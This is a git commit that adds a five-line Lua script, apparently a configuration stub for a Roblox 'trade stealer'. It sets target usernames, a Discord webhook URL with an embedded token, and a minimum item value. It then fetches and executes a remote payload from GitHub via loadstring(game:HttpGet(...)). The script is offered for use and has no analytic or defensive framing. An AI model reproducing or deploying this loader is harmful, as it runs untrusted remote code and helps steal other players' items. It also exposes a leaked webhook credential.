272a9aab0883bcb8d35432921eab4e40e7ce3be1
Russeruh <brycenicholasribardi@outlook.com>
2025-05-26 09:54:44 -0500

    upload 3dd88ac4c3129bcc794cb1ed.lua

---
+++ 3dd88ac4c3129bcc794cb1ed.lua
@@ -0,0 +1,5 @@
+Username = "hillyxyz"
+Username2 = "hillyxyz"
+Webhook = "https://discord.com/api/webhooks/1376574037299564668/wWw35lwP0xLjVp2c9tVdmylrlWeP3llv54HssVEy-TUzUHsSUEkCZ_BlZN5kI0w0cUl3"
+min_rap = 1
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/tradestealerbot.lua"))()
